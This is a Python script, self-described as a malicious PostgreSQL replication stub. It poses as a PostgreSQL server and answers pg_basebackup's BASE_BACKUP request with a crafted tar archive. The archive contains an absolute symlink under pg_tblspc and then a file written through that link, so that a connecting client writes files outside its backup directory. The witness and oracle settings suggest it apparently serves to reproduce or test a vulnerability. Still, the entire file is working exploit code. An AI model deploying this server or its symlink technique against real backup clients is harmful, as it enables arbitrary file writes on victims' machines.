#!/usr/bin/env python3
"""Malicious PostgreSQL 18.6 replication stub: BASE_BACKUP tar with absolute symlink."""

from __future__ import annotations

import os
import socket
import struct
import threading

WITNESS = os.environ.get("WITNESS", "POSTGRES-BASEBACKUP-SYMLINK-WITNESS")
BIND_HOST = os.environ.get("BIND_HOST", "0.0.0.0")
BIND_PORT = int(os.environ.get("BIND_PORT", "5432"))
ORACLE_DIR = os.environ.get("ORACLE_DIR", "/work/oracle")
SERVER_VERSION = os.environ.get("SERVER_VERSION", "18.6")
TBLSPC_OID = os.environ.get("TBLSPC_OID", "16384")

SSL_REQUEST_CODE = 80877103
GSSENC_REQUEST_CODE = 80877104
CANCEL_REQUEST_CODE = 80877102

TEXTOID = 25
INT8OID = 20
OIDOID = 26

TAR_BLOCK = 512
TAR_OFFSET_NAME = 0
TAR_OFFSET_MODE = 100
TAR_OFFSET_UID = 108
TAR_OFFSET_GID = 116
TAR_OFFSET_SIZE = 124
TAR_OFFSET_MTIME = 136
TAR_OFFSET_CHECKSUM = 148
TAR_OFFSET_TYPEFLAG = 156
TAR_OFFSET_LINKNAME = 157
TAR_OFFSET_MAGIC = 257
TAR_OFFSET_VERSION = 263
TAR_OFFSET_UNAME = 265
TAR_OFFSET_GNAME = 297
TAR_OFFSET_DEVMAJOR = 329
TAR_OFFSET_DEVMINOR = 337

def log(msg: str) -> None:
    print(msg, flush=True)


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("eof")
        buf.extend(chunk)
    return bytes(buf)


def send_msg(sock: socket.socket, tag: bytes, payload: bytes) -> None:
    sock.sendall(tag + struct.pack(">I", 4 + len(payload)) + payload)


def send_ready(sock: socket.socket) -> None:
    send_msg(sock, b"Z", b"I")


def send_complete(sock: socket.socket, tag: str) -> None:
    send_msg(sock, b"C", tag.encode("ascii") + b"\x00")


def send_error(sock: socket.socket, message: str) -> None:
    payload = b"SERROR\x00CXX000\x00M" + message.encode("utf-8") + b"\x00\x00"
    send_msg(sock, b"E", payload)
    send_ready(sock)


def print_tar_number(buf: bytearray, offset: int, length: int, val: int) -> None:
    idx = offset + length
    idx -= 1
    buf[idx] = ord(" ")
    remaining = val
    for _ in range(length - 1):
        idx -= 1
        buf[idx] = ord("0") + (remaining & 7)
        remaining >>= 3


def tar_checksum(header: bytes) -> int:
    total = 8 * ord(" ")
    for i, byte in enumerate(header):
        if i < TAR_OFFSET_CHECKSUM or i >= TAR_OFFSET_CHECKSUM + 8:
            total += byte
    return total


def tar_header(
    name: str,
    *,
    size: int = 0,
    mode: int = 0o644,
    typeflag: str = "0",
    linktarget: str | None = None,
) -> bytes:
    header = bytearray(TAR_BLOCK)
    filename = name
    if typeflag in {"2", "5"} and not filename.endswith("/"):
        filename = filename + "/"
    encoded_name = filename.encode("ascii")
    if len(encoded_name) > 99:
        raise ValueError(f"tar name too long: {filename}")
    header[TAR_OFFSET_NAME : TAR_OFFSET_NAME + len(encoded_name)] = encoded_name
    print_tar_number(header, TAR_OFFSET_MODE, 8, mode & 0o7777)
    print_tar_number(header, TAR_OFFSET_UID, 8, 999)
    print_tar_number(header, TAR_OFFSET_GID, 8, 999)
    payload_size = 0 if typeflag in {"2", "5"} else size
    print_tar_number(header, TAR_OFFSET_SIZE, 12, payload_size)
    print_tar_number(header, TAR_OFFSET_MTIME, 12, 0)
    header[TAR_OFFSET_TYPEFLAG] = ord(typeflag)
    if linktarget is not None:
        encoded_link = linktarget.encode("ascii")
        if len(encoded_link) > 99:
            raise ValueError(f"tar link too long: {linktarget}")
        header[TAR_OFFSET_LINKNAME : TAR_OFFSET_LINKNAME + len(encoded_link)] = encoded_link
    header[TAR_OFFSET_MAGIC : TAR_OFFSET_MAGIC + 6] = b"ustar\x00"
    header[TAR_OFFSET_VERSION : TAR_OFFSET_VERSION + 2] = b"00"
    header[TAR_OFFSET_UNAME : TAR_OFFSET_UNAME + 8] = b"postgres"
    header[TAR_OFFSET_GNAME : TAR_OFFSET_GNAME + 8] = b"postgres"
    print_tar_number(header, TAR_OFFSET_DEVMAJOR, 8, 0)
    print_tar_number(header, TAR_OFFSET_DEVMINOR, 8, 0)
    print_tar_number(header, TAR_OFFSET_CHECKSUM, 8, tar_checksum(header))
    return bytes(header)


def tar_pad(data: bytes) -> bytes:
    pad = (TAR_BLOCK - (len(data) % TAR_BLOCK)) % TAR_BLOCK
    return data + (b"\x00" * pad)


def tar_regular(name: str, content: bytes, mode: int = 0o644) -> bytes:
    return tar_header(name, size=len(content), mode=mode, typeflag="0") + tar_pad(content)


def tar_directory(name: str, mode: int = 0o700) -> bytes:
    return tar_header(name, mode=mode, typeflag="5")


def tar_symlink(name: str, target: str, mode: int = 0o777) -> bytes:
    return tar_header(name, mode=mode, typeflag="2", linktarget=target)


def build_control_tar() -> bytes:
    return tar_regular("PG_VERSION", b"18\n") + (b"\x00" * (2 * TAR_BLOCK))


def build_attack_tar() -> bytes:
    child = f"pg_tblspc/{TBLSPC_OID}/{WITNESS}"
    body = (
        tar_regular("PG_VERSION", b"18\n")
        + tar_directory("pg_tblspc")
        + tar_symlink(f"pg_tblspc/{TBLSPC_OID}", ORACLE_DIR)
        + tar_regular(child, f"{WITNESS}\n".encode("ascii"))
        + (b"\x00" * (2 * TAR_BLOCK))
    )
    return body


def send_row_description(
    sock: socket.socket,
    fields: list[tuple[str, int, int]],
) -> None:
    payload = struct.pack(">H", len(fields))
    for name, typeoid, typlen in fields:
        payload += name.encode("ascii") + b"\x00"
        payload += struct.pack(">I", 0)
        payload += struct.pack(">h", 0)
        payload += struct.pack(">I", typeoid)
        payload += struct.pack(">h", typlen)
        payload += struct.pack(">i", -1)
        payload += struct.pack(">h", 0)
    send_msg(sock, b"T", payload)


def send_data_row(sock: socket.socket, values: list[str | None]) -> None:
    payload = struct.pack(">H", len(values))
    for value in values:
        if value is None:
            payload += struct.pack(">i", -1)
        else:
            encoded = value.encode("utf-8")
            payload += struct.pack(">i", len(encoded)) + encoded
    send_msg(sock, b"D", payload)


def send_tuples(
    sock: socket.socket,
    fields: list[tuple[str, int, int]],
    rows: list[list[str | None]],
    tag: str = "SELECT",
    ready: bool = True,
) -> None:
    send_row_description(sock, fields)
    for row in rows:
        send_data_row(sock, row)
    send_complete(sock, tag)
    if ready:
        send_ready(sock)


def send_auth_ok(sock: socket.socket) -> None:
    send_msg(sock, b"R", struct.pack(">I", 0))
    params = {
        "server_version": SERVER_VERSION,
        "server_encoding": "UTF8",
        "client_encoding": "UTF8",
        "application_name": "pg_basebackup",
        "is_superuser": "on",
        "session_authorization": "postgres",
        "DateStyle": "ISO, MDY",
        "IntervalStyle": "postgres",
        "TimeZone": "UTC",
        "integer_datetimes": "on",
        "standard_conforming_strings": "on",
    }
    for key, value in params.items():
        send_msg(sock, b"S", f"{key}\x00{value}\x00".encode("ascii"))
    send_msg(sock, b"K", struct.pack(">II", 42, 99))
    send_ready(sock)


def parse_startup(payload: bytes) -> dict[str, str]:
    proto = struct.unpack(">I", payload[:4])[0]
    log(f"startup protocol={proto}")
    fields: dict[str, str] = {"_protocol": str(proto)}
    parts = payload[4:].split(b"\x00")
    idx = 0
    while idx + 1 < len(parts) and parts[idx]:
        key = parts[idx].decode("utf-8", "replace")
        value = parts[idx + 1].decode("utf-8", "replace")
        fields[key] = value
        idx += 2
    return fields


def handle_identify(sock: socket.socket, query: str) -> None:
    log(f"query identify {query!r}")
    send_tuples(
        sock,
        [
            ("systemid", TEXTOID, -1),
            ("timeline", INT8OID, 8),
            ("xlogpos", TEXTOID, -1),
            ("dbname", TEXTOID, -1),
        ],
        [["1234567890123456789", "1", "0/1000000", None]],
    )


def handle_show(sock: socket.socket, query: str) -> None:
    lowered = query.lower()
    if "wal_segment_size" in lowered:
        value = "16MB"
        name = "wal_segment_size"
    elif "data_directory_mode" in lowered:
        value = "0700"
        name = "data_directory_mode"
    else:
        log(f"query show-unknown {query!r}")
        send_error(sock, f"unrecognized SHOW: {query}")
        return
    log(f"query show {name}={value}")
    send_tuples(sock, [(name, TEXTOID, -1)], [[value]], tag="SHOW")


def send_copy_data(sock: socket.socket, payload: bytes) -> None:
    send_msg(sock, b"d", payload)


def send_copy_out(sock: socket.socket) -> None:
    send_msg(sock, b"H", b"\x00" + struct.pack(">H", 0))


def send_copy_done(sock: socket.socket) -> None:
    send_msg(sock, b"c", b"")


def handle_base_backup(sock: socket.socket, query: str) -> None:
    attack = "control" not in query.lower()
    archive = build_attack_tar() if attack else build_control_tar()
    log(
        f"query base_backup attack={str(attack).lower()} "
        f"bytes={len(archive)} oracle={ORACLE_DIR} witness={WITNESS}"
    )
    send_tuples(
        sock,
        [("recptr", TEXTOID, -1), ("tli", INT8OID, 8)],
        [["0/1000000", "1"]],
        tag="SELECT",
        ready=False,
    )
    send_row_description(
        sock,
        [
            ("spcoid", OIDOID, 4),
            ("spclocation", TEXTOID, -1),
            ("size", INT8OID, 8),
        ],
    )
    send_data_row(sock, [None, None, "1"])
    send_complete(sock, "SELECT")
    send_copy_out(sock)
    send_copy_data(sock, b"nbase.tar\x00\x00")
    offset = 0
    while offset < len(archive):
        chunk = archive[offset : offset + 8192]
        send_copy_data(sock, b"d" + chunk)
        offset += len(chunk)
    send_copy_done(sock)
    send_row_description(
        sock,
        [("recptr", TEXTOID, -1), ("tli", INT8OID, 8)],
    )
    send_data_row(sock, ["0/1000020", "1"])
    send_complete(sock, "SELECT")
    send_complete(sock, "BASE_BACKUP")
    send_ready(sock)


def dispatch_query(sock: socket.socket, query: str) -> None:
    stripped = query.strip().rstrip(";")
    upper = stripped.upper()
    if upper.startswith("IDENTIFY_SYSTEM"):
        handle_identify(sock, stripped)
    elif upper.startswith("SHOW"):
        handle_show(sock, stripped)
    elif upper.startswith("BASE_BACKUP"):
        handle_base_backup(sock, stripped)
    elif not stripped:
        send_complete(sock, "EMPTY")
        send_ready(sock)
    else:
        log(f"query unknown {stripped!r}")
        send_error(sock, f"unrecognized replication command: {stripped}")


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    log(f"conn from={addr[0]}:{addr[1]}")
    try:
        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while True:
            length_bytes = recv_exact(conn, 4)
            length = struct.unpack(">I", length_bytes)[0]
            if length < 8:
                raise ConnectionError("short first packet")
            rest = recv_exact(conn, length - 4)
            code = struct.unpack(">I", rest[:4])[0]
            if code == SSL_REQUEST_CODE:
                log("ssl-request -> N")
                conn.sendall(b"N")
                continue
            if code == GSSENC_REQUEST_CODE:
                log("gssenc-request -> N")
                conn.sendall(b"N")
                continue
            if code == CANCEL_REQUEST_CODE:
                log("cancel-request ignored")
                return
            startup = parse_startup(rest)
            log(f"startup-params {startup}")
            send_auth_ok(conn)
            break

        while True:
            header = conn.recv(1)
            if not header:
                return
            tag = header
            length = struct.unpack(">I", recv_exact(conn, 4))[0]
            payload = recv_exact(conn, length - 4) if length > 4 else b""
            if tag == b"X":
                log("terminate")
                return
            if tag == b"Q":
                query = payload.split(b"\x00", 1)[0].decode("utf-8", "replace")
                dispatch_query(conn, query)
                continue
            log(f"msg unknown tag={tag!r} len={length}")
            send_error(conn, f"unsupported message {tag!r}")
    except (ConnectionError, TimeoutError, OSError) as exc:
        log(f"conn-end err={exc}")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((BIND_HOST, BIND_PORT))
        server.listen(16)
        log(f"listen {BIND_HOST}:{BIND_PORT} version={SERVER_VERSION} witness={WITNESS}")
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            thread.start()


def main() -> int:
    serve()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
